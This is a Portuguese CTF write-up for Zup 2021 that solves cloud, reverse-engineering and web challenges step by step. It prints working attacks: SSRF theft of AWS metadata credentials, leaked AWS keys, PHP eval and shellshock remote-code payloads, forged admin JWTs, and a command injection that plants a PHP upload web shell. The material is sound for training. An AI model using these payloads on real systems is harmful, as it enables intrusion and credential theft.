# :triangular_flag_on_post: CTF Zup 2021  Write up 1#


Este documento contém todas as minhas respostas (passo a passo) e ferramentas utilizadas para resolução 
dos desafios do CTF Zup 2021

### Categorias
1. [Cloud Security](#can-you-find-information-about-the-instance)
    - [Can you find information about the instance?](#can-you-find-information-about-the-instance)
    - [Make the server give you the flag!](#make-the-server-give-you-the-flag)
    - [I made a mistake!](#i-made-a-mistake)
    - [No One Knows](#no-one-knows)
2. [Reverse](#incredible-obfuscation)
    - [Incredible Obfuscation](#incredible-obfuscation)
    - [Secret in the front-end is OK!](#secret-in-the-front-end-is-ok)
3. [Web Security](#simple-eval)
    - [Simple Eval](#simple-eval)
    - [My New Browser](#my-new-browser)
    - [09/24/2014](#09242014)
    - [Internal Problems](#internal-problems)
    - [Jail Want Tonic](#jail-want-tonic)
    - [Wrong page!](#wrong-page)
    - [Damn bro, I like pizza!](#dam-bro-i-like-pizza)
    - [The Final Countdown](#the-final-countdown)
4. [Trivia](#baby-steps-start-here)
    - [Baby steps (Start here)](#baby-steps-start-here)
    - [Flag enters the chat](#flag-enters-the-chat)
    - [Webmasters like to keep things private](#webmasters-like-to-keep-things-private)
    - [Feedback time](#feedback-time)
5. [Forense](#my-repo-is-broken)
    - [My repo is broken](#my-repo-is-broken)
7. [Ferramentas](#aws-cli)

## Cloud Security :cloud: ##

### Can you find information about the instance? ###

Esse desafio nos dá uma página web hospedada em um servidor AWS, com um formulário simples que tem como action um arquivo de nome `code.php` e um query string de nome `url`.

![About Instance](/cloud/about-instance/001.png)

Qualquer coisa enviada nesse query string retorna uma resposta 200 com cabeçalho de content-type `image/png`.
Tento então enviar o próprio nome da página como parâmetro `(code.php)` e uma "imagem" me é retornada.
Essa imagem é na verdade o código fonte da página, e com ele fica mais fácil entender o que podemos fazer aqui.


```php
<?php
/**
* Check if the 'url' GET variable is set
* Example - http://localhost/?url=http://site.com
*/
if (isset($_GET['url'])){
$url = $_GET['url'];

/**
* Send a request vulnerable to SSRF since
* no validation is being done on $url
* before sending the request
*/
$image = fopen($url, 'rb');

/**
* Send the correct response headers
*/
header("Content-Type: image/png");

/**
* Dump the contents of the image
*/
fpassthru($image);}
```

Sabendo que o desafio se trata de informações sobre a instância aws, tento então passar como parâmetro a url abaixo
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

E isso me retorna credenciais válidas para autenticação através do aws cli. Após isso basta utilizá-las para executar os comandos 

```shell
aws s3api list-buckets
aws s3 cp s3://flag-ctf/flag.txt ./
cat flag.txt
```

![About Instance](/cloud/about-instance/002.png)

Para descobrir os buckets que essas credenciais têm acesso e obter a nossa flag

![About Instance](/cloud/about-instance/003.png)


### Make the server give you the flag! ###

Esse desafio nos dá a url abaixo

https://nzko6vbnx0.execute-api.sa-east-1.amazonaws.com/CTF a qual, se acessada através do método GET nos retorna

```json
{
    "message": "Missing Authentication Token"
}
```

Mas basta então executar a mesma requisição com o método POST e a flag é retornada. Aparentemente a necessidade de autenticação não existe para todos os métodos HTTP ;)

```json
{
    "statusCode": 200,
    "body": "\"Hello from Lambda! flag: ZUP-{Infl3xA0_nB_r4_b_A}\""
}
```

### I made a mistake! ###

Esse desafio nos dá uma página html bem simples com uma dica 'Acho que está seguro'.

https://invoke-batata.s3-sa-east-1.amazonaws.com/index.html

Aproveitando que já tinha conseguido as credenciais da aws nos desafios anteriores, volto novamente ao aws cli e procuro por algo relacionado a este desafio por lá.

```shell
aws s3 ls s3://invoke-batata
```
![Mistake](/cloud/i-made-a-mistake/001.png)

E encontro um arquivo key.txt com outras credenciais AWS. Seto então essas credenciais como envs esperadas pelo aws cli

![Mistake](/cloud/i-made-a-mistake/002.png)

```shell
export AWS_ACCESS_KEY_ID=AKIAUYWIIKCH42OKFH7F
export AWS_SECRET_ACCESS_KEY=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
```

e executo os comandos abaixo

```shell
aws configure set region sa-east-1
aws lambda list-functions
aws lambda invoke --function-name VulnerableFunction response.json
```

Que fazem, respectivamente, listar as funções lambdas disponíveis e executar a "função vulnerável" que nos retorna a flag.

![Mistake](/cloud/i-made-a-mistake/003.png)

### No One Knows! ###

Este desafio nos dá uma página com apenas uma imagem e um trecho de música escondido em um comentário html XD.
Existe ainda na página um comentário citando um repo git. Ao acessar o repo é possível ver no histórico um commit mencionando um arquivo txt e credenciais AWS para acesso ao tal arquivo.

![Who knows](/cloud/no-one-knows/001.png)

Tento então acessar o arquivo pela url 

https://noonekonws-ctf.s3.us-west-2.amazonaws.com/aaaaaaaaaaaa.txt

Passando as credenciais via query string, porém é retornado erro dizendo que esse request já está expirado.
Após procurar mais um pouco chego na conclusão que seria possível acessar executando o comando abaixo no aws cli

```shell
aws s3 presign s3://noonekonws-ctf/aaaaaaaaaaaa.txt
```
Pois esse recurso nos gera uma nova url válida, que ao ser acessada retorna então nossa flag ;)

![Who knows](/cloud/no-one-knows/002.png)


## Reverse :key: ##

### Incredible Obfuscation ###

Esse desafio nos apresenta uma página html que executa um alert solicitando uma senha.
Ao digitar qualquer coisa é exibido um dialog com o dizer 'WRONG PASSWORD'

![Obfuscation](/reverse/obfuscation/001.png)

Ao analisar a página percebo que se trata apenas de html e javascript, e que toda a lógica para obter a flag estaria no próprio front.
O javascript contém menções para a função fromCharCode e também a string em hex abaixo

```javascript
'\x39\x30\x20\x38\x35\x20\x38\x30\x20\x34\x35\x20\x31\x32\x33\x20\x31\x30\x31\x20\x39\x37\x20\x31\x31\x35\x20\x31\x32\x31\x20\x39\x35\x20\x31\x30\x32\x20\x31\x30\x38\x20\x39\x37\x20\x31\x30\x33\x20\x39\x35\x20\x35\x32\x20\x39\x35\x20\x31\x31\x31\x20\x31\x31\x30\x20\x39\x39\x20\x31\x30\x31\x20\x39\x35\x20\x31\x30\x35\x20\x31\x31\x30\x20\x39\x35\x20\x39\x37\x20\x39\x35\x20\x31\x31\x39\x20\x31\x30\x34\x20\x31\x30\x35\x20\x31\x30\x38\x20\x31\x30\x31\x20\x31\x32\x35'
````
Que parecia ser a nossa flag! Bastou então executar o script abaixo para obtê-la:


```javascript
'\x39\x30\x20\x38\x35\x20\x38\x30\x20\x34\x35\x20\x31\x32\x33\x20\x31\x30\x31\x20\x39\x37\x20\x31\x31\x35\x20\x31\x32\x31\x20\x39\x35\x20\x31\x30\x32\x20\x31\x30\x38\x20\x39\x37\x20\x31\x30\x33\x20\x39\x35\x20\x35\x32\x20\x39\x35\x20\x31\x31\x31\x20\x31\x31\x30\x20\x39\x39\x20\x31\x30\x31\x20\x39\x35\x20\x31\x30\x35\x20\x31\x31\x30\x20\x39\x35\x20\x39\x37\x20\x39\x35\x20\x31\x31\x39\x20\x31\x30\x34\x20\x31\x30\x35\x20\x31\x30\x38\x20\x31\x30\x31\x20\x31\x32\x35'.replaceAll(" ",",").split(",").map(n => String.fromCharCode(n)).join('')

````
O que nos retorna a flag ZUP-{easy_flag_4_once_in_a_while}


### Secret in the front-end is OK! ###

A url desse desafio é http://54.232.129.62/e1d9018d-a3a3-4c00-af1b-427e446a5b6c/ e...
OK, esse desafio também parece ser apenas do tipo client-side, até mesmo pelo seu título. Porém o seu código é bem difícil de entender!

![Frontend is safe](/reverse/frontend-sec/001.png)

Ok, se não podemos entendê-lo então vamos debugá-lo. Mas ao tentar fazer isso tenho uma surpresa, ficamos em loop por breakpoints em funções anônimas

![Frontend is safe](/reverse/frontend-sec/002.png)

Resolvo então fazer download do código e processá-lo em um javascript beautifier (codebeautify.org/jsviewer), para pelo menos ter um código identado.
Salvo o arquivo novo, agora um pouquinho melhor de acompanhar.

![Frontend is safe](/reverse/frontend-sec/003.png)

Vejo que há pelo código trechos com a palavra `debugger` ou ainda lugares que contém apenas um trecho dessa string como `debu`, e penso que eles são os vilões por trás do meu loop. Apenas troco para algo como `debugx` ou ainda `debub` e executo novamente. Boa! Sem mais problemas com o loop infinito em debug.
Acompanho então o código, e vou adicionando logs ao longo dele para auxiliar no processo de entender o funcionamento. Vejo um if curioso e resolvo alterá-lo.

![Frontend is safe](/reverse/frontend-sec/004.png)

Ao atualizar a página vejo a flag no console XD

`ZUP-{n0_f1n4l_3_53mpr3_um4_p3551m4_1d314}`


## Web Security :computer: ##

### Simple Eval ###

Esse desafio nos apresenta o endereço http://18.231.79.49:8088/ o qual parece ser uma simples página html, porém com o comentário abaixo
```html
<!--
$str=@(string)$_GET['str'];
blockListFilter($block_list, $str);
eval('$str="'.addslashes($str).'";');
-->
```

OK, esse é um código vulnerável que pressupõe que precisamos usar aspas para programar em PHP e que a atribuição do parâmetro a uma variável faz o uso do eval ser uma boa ideia.
Atribuindo o código abaixo ao parâmetro str 

```php
${eval($_GET[chr(99)])}
```
e enviando código php na query string 'c' , conseguimos atingir a execução de código php no servidor (RCE)

Alguns comandos após chego na url final que possibilita a leitura da flag

```php
http://18.231.79.49:8088/?str=${eval($_GET[chr(99)])}&c=system('cat ../../../flag/flag.txt');
```

ZUP-{alkdjsEfdskljdaseAxcV==}


### My New Browser ###
Esse desafio nos da um endereço http://18.231.79.49:10080/ que retorna o texto abaixo

```html
This site best viewed in [Zup-Web-Browser] the best browser in the world!
```

HM...envio o request novamente, porém agora com o header `User-Agent: Zup-Web-Browser`
E ele me retorna uma mensagem um tanto engraçada kkk

```html
Get out of here, Hacker!! This page can only be accessed from the local client!
```

Refaço a requisição pela terceira vez, mas agora adicionando o header `X-Forwarded-For` com o valor `127.0.0.1` 
e por fim ele me retorna a flag ZUP-{klapaucius}


### 09/24/2014 ###

Ok, esse desafio nos da o endereço http://challenges.ctfd.io:30114/ e uma data. Uma data. Imagino que seja a data de uma falha importante e procuro por
isso no google: `CVE 2014-09-24`. Descubro uma falha conhecida como `shellshock`, uma baita falha no bash em servidores linux/mac.
Essa vulnerabilidade permite execução de código bash de forma remota, enviando esse código em um header como o `User-Agent`, por exemplo.
Duas requisições com o header User-Agent atribuído às linhas abaixo bastam para encontrar e ler a flag

```bash
() { :; }; echo ls; #valor do header no request1
() { :; }; cat flag.txt; #valor do header no request2
```

Nossa flag ZUP-{7623478647386243274}

E cara.. que vulnerabilidade bizarra!

### Internal Problems ###

Esse desafio estava disponível no endereço http://challenges.ctfd.io:30106/ e nos apresenta uma página html contendo um código em php, supostamente
o código que está rodando no servidor. 

Este código contém um include para um arquivo chamado secret.php, que provavelmente é a nossa flag, porém acessível somente caso o if abaixo seja
atingido

```php
<?php

if (
    isset($_POST['pepino']) &&
    $_POST['pepino'] != 'aabC9RqS' &&
    md5('aabC9RqS') == md5($_POST['pepino'])
) {
    include('secret.php');
    print $super_secret;
} else {
    show_source(__FILE__);
}
```

Num primeiro momento, aparentemente somente a string `aabC9RqS` deveria ser enviada para que o md5 gerasse o mesmo hash e a condição do if fosse alcançada,
porém o mesmo if trata de não nos permitir enviar essa string.

Sabendo da existência de colisões no algoritmo de hash md5, procuro no google pelo termo utilizado no if `aabC9RqS` a fim de verificar se já existe algum outro valor conhecido que colida com este e acabo encontrando seu par de colisão: `aabg7XSs`. Basta então enviar esse segundo no request e a flag ZUP-{ju66l1n6_b3_my_6u1d3} nos é retornada :)


### Jail Want Tonic ###

O desafio disponível em http://18.231.79.49/ nos apresenta uma página html com um bom tom de humor, satirizando empresas "faz tudo" e descoladas xD.
Ao executar o dirseach na página encontro alguns diretórios interessantes, que num primeiro momento apesar de indicados na própria pagina haviam passado batidos

```shell
dirsearch -u http://18.231.79.49/
```

![Jail want Tonic](/web/jail-want-tonic/001.png)

Descubro a existência dos diretórios /login e /admin e ao entrar no primeiro é exibida um formulário de login que aparenta aceitar qualquer usuário e senha e nos gera um JWT válido. Na mesma página de login há a indicação da secret JWT utilizada no backend (nos mostrando a importância de guardá-la bem e não reutilizá-la em sistemas e/ou ambientes distintos).

```html
<!--JWT_SECRET=Th1sSECr3TMu5TN0Tb3L43KEDEv3RRRRRR!!1-->
```

Ao realizar a requisição abaixo, por exemplo

```shell
curl -s -i 'http://18.231.79.49/login' \
--data-raw 'username=admin&password=123' | grep 'x-access-token'
```
Nos é retornado um JWT válido como o seguinte

```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5xenZhIiwicGFzc3dvcmQiOiIxMjMiLCJhZG1pbiI6InNueWZyIiwiaWF0IjoxNjE5NTYyMjk4fQ.yslwz-NaROVsC2G3EWOAgTNNxP26I6cbLFBvuC7fvYg
```

Que guarda o seguinte payload

```json
{
  "username": "nqzva",
  "password": "123",
  "admin": "snyfr",
  "iat": 1619562298
}
```

Percebo duas coisas importantes aqui. Que existe um atributo 'admin' e que o username não é o mesmo que eu informei, parece existir algum algoritmo que ofusca alguns campos do payload do JWT, o que é legal para tentar manter certos dados do token sigilosos.
Tento acessar, então, o diretório de 'Admin', utilizando esse JWT:


```shell
curl 'http://18.231.79.49/Admin/' -s \
  -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5xenZhIiwicGFzc3dvcmQiOiIxMjMiLCJhZG1pbiI6InNueWZyIiwiaWF0IjoxNjE5NTYyNDg2fQ.-6qEI5PLltqwAiFLwiee0axLX9Qs1dVC7O3iD-zAmww'
```

E o retorno do servidor é : Access Denied: You are not an Admin.
Resolvo então fazer um request enviando como nome do admin o tal valor snyfr que me foi retornado no payload do JWT


```shell
curl -s -i 'http://18.231.79.49/login' \
--data-raw 'username=snyfr&password=123' | grep 'x-access-token'
```

E para minha satisfação o JWT retornado contém o payload

```json
{
  "username": "false",
  "password": "123",
  "admin": "snyfr",
  "iat": 1619562915
```

O campo admin é, na verdade, um booleano que indica se somos ou não admin, e para saber qual seria a string que significaria 'true' basta um request enviando 'true' como username, o que nos retorna 'gehr'. Mas se a flag admin é preenchida internamente e está como false, como consigo mudar isso?
Com a secret do JWT nós podemos alterar o payload do JWT e manter sua assinatura ainda válida. Utilizo para isso a ferramenta jwt.io

![Jail want Tonic](/web/jail-want-tonic/002.png)

Boa, agora temos um jwt válido e indicando que somos admin! Testo a requisição novamente com esse novo token

```shell
curl 'http://18.231.79.49/Admin/' -s \
  -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJhZG1pbiI6ImdlaHIiLCJpYXQiOjE2MTk1NjMxMzl9.-pJPU_2EmGiFoY-CjoG0IT_zXfhcGH6M7nHLL-XPLPc'
```
Mas agora recebo outro erro: Username not found in admin list.

Volto à página inicial do site e reparo que existe um menu chamado 'Our admins'. Esse link retorna um arquivo, e neste arquivo existem alguns nomes de admins. Altero novamente no JWT, dessa vez o atributo username, para que contenha um dos nomes da lista (ofuscado com o tal algoritmo que transforma true em gehr e que não nos é necessário saber a origem uma vez que basta um request para ofuscar um valor desejado)

```shell
curl 'http://18.231.79.49/Admin/' -s \
  -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Indid2IiLCJwYXNzd29yZCI6IjEyMyIsImFkbWluIjoiZ2VociIsImlhdCI6MTYxOTU2MzY5Nn0.exwPDuBJdHwbhxThXchcGryrlo8YcCM2gtgACMMkLvQ'
```

E agora sim, parece que nossa flag está à vista : `Hey jojo! Here's your flag: MHC-{vqqdq vqxsn}`

Faço um último request passando como username a própria flag, e obtenho ela em texto plano.

```shell
curl -s -i 'http://18.231.79.49/login' \
--data-raw 'username=MHC-{vqqdq vqxsn}&password=123' | grep 'x-access-token'
```

![Jail want Tonic](/web/jail-want-tonic/003.png)
 
E por fim temos nossa flag: ZUP-{iddqd idkfa}

### Wrong page! ###

Esse desafio nos dava uma página html de url http://54.232.129.62/61ec5ae1-cfbf-4b83-b432-5644c916c94b/ 
com o dizer 'página errada'. Demorou um tempo para eu sacar e olhar no css, que a flag na verdade estava em um
comentário dentro do css.

![Zupinhas Wrong Page](/web/wrong-page/001.png)

A flag era ZUP-{__w3lc0me__}


### Damn bro, I like pizza! ###

Esse desafio nos apresenta uma página com um texto simples dizendo que a mente por trás da chal gosta muito de pizza, mas sem ketchup. Ao analisar o
response do servidor vejo que existe uma diretiva em header que define um Cookie de nome 'pizza' e com o seguinte valor 

`N2ZhM2I3NjdjNDYwYjU0YTJiZTRkNDkwMzBiMzQ5Yzc%3D`

Ao analisar a string é possível identificar que ela está, na verdade, em base64. E após decodificar, identifico um hash md5 que descubro ser bem comum (ao jogar no google) que é gerado a partir da palavra 'no'.
Faço então o processo reverso, tirando um hash md5 da palavra 'yes' e codificando como base64. E por fim temos dois cookies, que fazem todo o sentido com
a narrativa da chall. O autor ama pizza, mas odeia ketchup. O nosso cookie deveria ser, então, algo como o seguinte

```javascript
document.cookie = `ketchup=${btoa(md5('no'))};pizza=${btoa(md5('yes'))}`
```

E ao acessar a página com esses cookies, temos a flag `ZUP{p1zz4_qu3n71nh4_hmmmmmmm}`


### The Final Countdown ###

Esse desafio nos da o endereço http://challenges.ctfd.io:30119/?page=service
e ao acessar a página temos apenas um texto `Only authorized people can access this page.` e um cookie 'PASSWORD=password' e a menção para um parâmetro 'debug'. Faço alguns testes com esse tal parâmetro debug e nada.
Decido então rodar um dirsearch e descubro a existência do arquivo `/root/config.php`.

Acesso esse arquivo mas não tenho sucesso em lê-lo diretamente, pois é retornado o texto `Don't access this file directly!`.
Tento então inserir esse arquivo como parâmetro da query string page, acessando a url `http://challenges.ctfd.io:30119/?page=root/config`
Percebo que essa chamada retorna sucesso, enquanto, por exemplo, uma chamada `http://challenges.ctfd.io:30119/?page=root/configabc` retorna 500.

A conclusão é que temos uma função php include que está sendo mal utilizada, uma vez que esse include aparentemnte simplesmente recebe o nosso parâmetro e inclui o arquivo php, sem fazer nenhuma validação do que é input do usuário. Algo como o código 

```php
<?php
include($_GET['page'] . '.php')
```

Mas se eu não consigo fazer uploads de arquivos php para obter um RCE e aparentemente também não consigo incluir arquivos remotos (pois o servidor parecia protegido quanto a isso), o que posso tirar disso?

Após alguns testes e pesquisas percebo que é possível, no entanto, fazer uso do protocolo php para ler o conteúdo dos arquivos php e aí sim entender o que está acontecendo por trás do frontend!

Faço o seguinte request 

```shell
curl -s 'http://challenges.ctfd.io:30119/?page=php://filter/convert.base64-encode/resource=root/config'
```

E valido a hipótese! Conseguimos mesmo ler o código do server, obtendo o retorno em base64 e decodificando o mesmo :)
Leio também o código da própria página service, fazendo o request

```shell
curl -s 'http://challenges.ctfd.io:30119/?page=php://filter/convert.base64-encode/resource=service'
```

E aqui se encontra o código desta última

```php
<?php
ini_set('max_execution_time', 5);
include_once("./root/config.php");

if ($_COOKIE['password'] !== md5($password)) {
    setcookie('password', 'PASSWORD');
    echo "<!-- For debugging try parameter debug -->";
    die('Only authorized people can access this page.');
}

if (isset($_POST["debug"])) {
    echo "The Character Count is: " . exec('printf \'' . $_POST["debug"] . '\' | wc -c') . ".";
}
```

O tal parâmetro debug então, na verdade deveria ser usado via post. E nunca seria executado se o cookie password não fosse igual ao hash da variável $password, que
se encontra definida no nosso outro arquivo, o root/config.php

```php
<?php

$password = "w3'r3 h34d1n' f0r v3nu5 (v3nu5)";

// I think this is vulnerable, but still in dev
if(count(get_included_files()) == 1) {
    echo "Don't access this file directly!";
}
```

Tiro o hash md5 desse texto, que nos dá o valor `f2464cff8995243e54b0c7e37c02f878` e faço um novo request (POST) enviando ele no cookie `PASSWORD`
e enviando o parâmetro debug como 'a'

```shell
curl -L -X POST 'http://challenges.ctfd.io:30119/?page=service' -H 'Cookie: password=f2464cff8995243e54b0c7e37c02f878' -F 'debug="a"'
```

Boaa!! Obtemos um novo retorno `The Character Count is: 1`. Voltando ao código fonte novamente, percebemos que existe uma função exec também vulnerável 
a injeção de código shell, e aí sim temos um RCE!.

Após alguns testes sem sucesso de ler a flag diretamente através dessa página, resolvo fazer upload de arquivo php para o servidor, pois apesar de vulnerável a UX do invasor não estava das mais agradáveis xD injetando código através do parâmetro debug. Para fazer o upload de um código php faço o request abaixo 

```shell
curl -L -X POST 'http://challenges.ctfd.io:30119/?page=service' -H 'Referer: http://18.231.79.49/login' -H 'Cookie: password=f2464cff8995243e54b0c7e37c02f878' -F 'debug="<!DOCTYPE html><html><head>  <title>File Upload</title></head><body>  <form enctype=\"multipart/form-data\" action=\"\" method=\"POST\">    <p>Upload your file</p>    <input type=\"file\" name=\"uploaded_file\"></input><br />    <input type=\"submit\" value=\"Upload\"></input>  </form></body></html><?PHP if(!empty($_FILES[\"uploaded_file\"])) { $path = \"\"; $path = $path . basename( $_FILES[\"uploaded_file\"][\"name\"]); if(move_uploaded_file($_FILES[\"uploaded_file\"][\"tmp_name\"], $path)) { echo \"The file \". basename( $_FILES[\"uploaded_file\"][\"name\"]). \" has been uploaded\"; } else{ echo \"There was an error uploading the file, please try again!\"; } } ?>'\'' >> zlanafazuploadporaqui.php #"'
```

E agora temos um formulário de upload sem nenhuma restrição no servidor, e pronto para nosso uso!
Acesso a minha página http://challenges.ctfd.io:30119/zlanafazuploadporaqui.php e faço upload de um projeto open source (de um arquivo) muito massa chamado phpbash. Nada mais faz do que nos fornecer um terminal com uma UX bem melhor! 

Acesso então o meu terminal pessoal

![The fucking final countdown](/web/the-final-countdown/001.png)

Após algumas explorações, descubro a localidade da flag

![The fucking final countdown](/web/the-final-countdown/002.png)

Mas não consigo ler seu conteúdo, pois sua permissão é 640 e o seu dono é o usário `netsparker` enquanto eu estou rodando sob o `www-data` (apache).

![The fucking final countdown](/web/the-final-countdown/003.png)

Após vários artigos de privesc lidos e nenhum sucesso e conseguir bypassar a permissão, tento autenticar o `netsparker` com a senha `netsparker`, e
a vulnerabilidade estava na minha cara o tempo todo. A senha do netsparker era netsparker!

```shell
echo 'netsparker' | su netsparker -c 'cat ../../../../../flag/secos/e/molhados/flag.txt'
```

![The fucking final countdown](/web/the-final-countdown/004.png)

E a nossa valiosa flag era ZUP-{mu51c4_p0pul4r_br451l31r4_4b0v3_4ll}


## Trivia :thinking: ##

### Baby steps (Start here) ###

Esse "desafio" nos dá a flag de graça e as boas-vindas ao evento o/

### Flag enters the chat ###

Existe nesse desafio uma descrição que diz que a flag foi escondida na própria plataforma do CTF. Após alguma análise consigo encontrá-la na página inicial como um comentário html no código da página

```html
<!-- WlVQLXt2MWQ0X2wwazRfNzRtYjNtXzRtNH0= -->
```

Que após decodificado (base64) retorna o texto ZUP-{v1d4_l0k4_74mb3m_4m4} 

### Webmasters like to keep things private ### 

Esse desafio se trata de um servidor 'escondido'. E nos dá duas dicas sobre, um IP em hex `0x36e8813e` e um domínio nada convencional `pepino.brocolis`
Bastou então converter o ip hex em decimal (google hex ip to decimal) para obtermos o endereço 54.232.129.62
Bastou então acessar o ip passando o header host : pepino.brocolis

```shell
curl 54.232.129.62 -H "Host: pepino.brocolis"

```
Para obter nossa flag 

`Flag: ZUP-{h16h_w4y_7h3_h3ll_05_n0t}`


### Feedback time ###

Esse foi o momento de responder ao time o que achamos do evento e qual o desafio que mais curtimos. Deixando público meu feedback, da minha parte 
o mais divertido e desafiador foi também o mais valioso: The final countdown. Sensacional!!

## Forense :mag: ##

### My repo is broken ###

Esse desafio nos dá um zip com repositório git quebrado e diz que a flag está lá dentro. Bastou utilizar um editor de texto como o Sublime 
e buscar pela palavra chave ZUP, e após alguns testes e flags falsas é possível encontrar a verdadeira `ZUP-{345y_b0y_345555yyyyy}`


# Ferramentas :hammer: # 

### AWS Cli ###
CLI da AWS disponível neste [link](https://aws.amazon.com/pt/cli/) 
### dirsearch ###
Ferramenta open-source de varredura por diretórios comuns disponível [em](https://github.com/maurosoria/dirsearch)
### Burp Suite Community Edition ###
Ferramenta para busca de vulnerabilidades web disponível [em](https://portswigger.net/burp/communitydownload)
### PHP Bash ###
Sistema open-source em PHP que simula um terminal bash disponível [em](https://github.com/Arrexel/phpbash)